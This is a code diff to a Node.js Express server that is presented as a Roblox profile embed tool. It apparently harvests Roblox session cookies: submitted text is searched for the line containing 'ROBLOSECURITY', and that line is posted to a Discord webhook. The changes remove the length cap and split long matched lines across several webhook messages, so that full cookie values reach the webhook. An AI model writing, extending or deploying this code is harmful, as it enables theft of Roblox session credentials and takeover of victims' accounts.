@@ -5,6 +5,7 @@ const express = require("express");
 const axios = require("axios");
 
 const app = express();
+const publicDir = path.join(__dirname, "public");
 
 const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const TARGET_LINE_KEYWORD = process.env.TARGET_LINE_KEYWORD || "ROBLOSECURITY";
@@ -13,15 +14,15 @@ const END_FILLER_LENGTH = 24;
 app.use(express.json({ limit: "5mb" }));
 
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile(path.join(publicDir, "index.html"));
 });
 
 app.get("/styles.css", (req, res) => {
-  res.sendFile(path.join(__dirname, "styles.css"));
+  res.sendFile(path.join(publicDir, "styles.css"));
 });
 
 app.get("/website.js", (req, res) => {
-  res.sendFile(path.join(__dirname, "website.js"));
+  res.sendFile(path.join(publicDir, "website.js"));
 });
 
 app.get("/favicon.ico", (req, res) => {
@@ -93,7 +94,7 @@ function sanitizeSubmittedText(value) {
   return cleanDiscordText(trimLineFillers(findSubmittedLineByKeyword(value, TARGET_LINE_KEYWORD)));
 }
 
-function chunkText(value, maxLength = 3900) {
+function chunkText(value, maxLength = 3800) {
   const chunks = [];
   let remaining = String(value || "");
 
@@ -215,25 +216,36 @@ async function sendProfileEmbed(userId, submittedText = "") {
       throw error;
     }
 
-    if (textChunks.length > 9) {
-      const error = new Error("Matched line is too long for Discord embeds.");
-      error.clientStatus = 400;
-      error.clientMessage = "The matched keyword line is too long to fit inside one Discord webhook message.";
-      throw error;
-    }
-
-    payload.embeds.push(
-      ...textChunks.map((chunk, index) => ({
-        title: textChunks.length === 1 ? "Matched Line" : `Matched Line (${index + 1}/${textChunks.length})`,
-        description: "```txt\n" + chunk + "\n```",
-        color: 0x4f76ff,
-      }))
-    );
+    payload.embeds.push({
+      title: textChunks.length <= 1 ? "Matched Line" : `Matched Line (1/${textChunks.length})`,
+      description: "```txt\n" + textChunks[0] + "\n```",
+      color: 0x4f76ff,
+    });
 
     const discordResponse = await axios.post(WEBHOOK_URL, payload, {
       timeout: 15000,
       maxBodyLength: Infinity,
     });
+
+    for (let index = 1; index < textChunks.length; index += 1) {
+      await axios.post(
+        WEBHOOK_URL,
+        {
+          content: `Matched line continued (${index + 1}/${textChunks.length})`,
+          embeds: [
+            {
+              title: `Matched Line (${index + 1}/${textChunks.length})`,
+              description: "```txt\n" + textChunks[index] + "\n```",
+              color: 0x4f76ff,
+            },
+          ],
+        },
+        {
+          timeout: 15000,
+          maxBodyLength: Infinity,
+        }
+      );
+    }
 
     return {
       success: true,
@@ -243,15 +255,23 @@ async function sendProfileEmbed(userId, submittedText = "") {
       thumbnail: profile.thumbnail,
       profileUrl: profile.profileUrl,
       embeddedMatchedLine: Boolean(sanitizedText),
+      matchedLineChunks: textChunks.length,
     };
   } catch (error) {
     const status = error.response?.status;
+    const discordMessage =
+      error.response?.data?.message ||
+      (Array.isArray(error.response?.data?._errors)
+        ? error.response.data._errors.map((item) => item.message).join(" ")
+        : "");
 
     const message =
       error.clientMessage ||
       (status === 404
         ? "Roblox profile was not found."
-        : "Could not send the Roblox profile embed.");
+        : discordMessage
+          ? `Discord rejected the webhook payload: ${discordMessage}`
+          : "Could not send the Roblox profile embed.");
 
     console.error("Roblox profile embed failed:", error.message || error);
 
